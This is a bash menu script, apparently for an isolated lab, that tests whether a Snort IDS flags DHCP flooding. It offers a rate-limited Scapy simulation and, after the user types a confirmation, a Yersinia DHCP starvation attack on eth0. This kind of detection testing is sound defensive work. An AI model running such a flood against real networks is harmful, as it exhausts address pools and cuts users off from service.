#!/bin/bash
# =============================================================================
# Controlled DHCP Flooding Simulation Helper (Lab Environment ONLY)
# =============================================================================
set -e

echo "================================================================"
echo "  CONTROLLED DHCP FLOODING TEST (ISOLATED LAB ONLY)"
echo "================================================================"
echo "  Target: EXTERNAL segment (10.10.0.0/24) via eth0"
echo "  Snort IDS: 10.10.0.5 (promiscuous monitoring)"
echo "  DHCP Relay: 10.10.0.1 -> DHCP Server: 192.168.0.100"
echo ""
echo "  Options:"
echo "    [1] Safe Scapy Simulation (Sends 20 Discovers at 10 pkt/s)"
echo "        -> Safely triggers Snort rule (threshold >= 10 in 5s)"
echo "    [2] Yersinia Interactive (CLI attack mode with manual stop)"
echo "    [3] Exit"
echo "================================================================"
read -p "Select option [1-3]: " CHOICE

case "$CHOICE" in
    1)
        echo ""
        echo "[*] Launching safe Scapy simulation..."
        python3 /root/dhcp_flood_scapy.py 20 0.1
        echo ""
        echo "[*] Test packets sent. Check alerts on snort container:"
        echo "    /home/ubuntu/view_alerts.sh"
        ;;
    2)
        echo ""
        read -p "Type 'START' to confirm launching Yersinia flood: " CONFIRM
        if [ "$CONFIRM" != "START" ]; then
            echo "Aborted."
            exit 0
        fi
        echo "[*] Launching Yersinia DHCP attack (Press Ctrl+C to terminate)..."
        yersinia dhcp -attack 1 -interface eth0
        ;;
    3)
        echo "Exited."
        exit 0
        ;;
    *)
        echo "Invalid choice."
        exit 1
        ;;
esac
